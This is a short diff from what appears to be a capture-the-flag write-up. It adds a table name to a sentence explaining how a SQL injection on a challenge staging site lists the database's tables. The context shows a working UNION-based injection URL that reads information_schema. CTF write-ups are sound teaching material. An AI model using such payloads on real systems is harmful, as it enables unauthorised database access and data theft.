@@ -69,7 +69,7 @@ This can be rewritten for our SQLi flaw:
 ```
 https://staging.jackfrosttower.com/detail/0,0 union select * from (select 1)a1 join (select 2)a2 join (select table_name from information_schema.tables)d join (select 3)j join (select 4)k join (select 5)l join (select 6)m;--
 ```
-This reveals, that in addition to the tables `emails` and `uniquecontact`, which are known as they are used in the application and in the provided schema of encontact `encontact_db.sql`, there is an additional table `todo`, which seems to be the todo list we need access to.
+This reveals, that in addition to the tables `user`, `emails` and `uniquecontact`, which are known as they are used in the application and in the provided schema of encontact `encontact_db.sql`, there is an additional table `todo`, which seems to be the todo list we need access to.
 
 Using the SQL statement
 ```
